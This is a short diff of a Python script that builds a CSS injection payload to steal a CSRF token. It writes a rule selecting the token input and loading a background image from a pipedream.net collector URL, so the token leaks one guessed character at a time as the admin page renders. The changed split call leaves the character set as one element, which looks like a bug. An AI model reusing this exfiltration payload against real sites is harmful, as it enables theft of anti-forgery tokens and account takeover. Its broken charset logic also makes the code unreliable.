@@ -4,16 +4,19 @@ import os
 
 def build_css(chars):
     # supp du file
-    os.remove("./test/a.css")
+    os.remove("./a.css")
 
     # création du new file
-    file = open("./test/a.css", "w") 
+    file = open("./a.css", "w") 
     file.write("input[name=csrf] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/"+chars+") }") 
     file.close()
 
 # ----
-chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split("")
+chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split()
 know  = ""
+
+# envoie à admin 
+
 
 while 1:
     for elt in chars:
@@ -31,5 +34,3 @@ while 1:
 
 
     know += input("new chars to know : ")
-
-
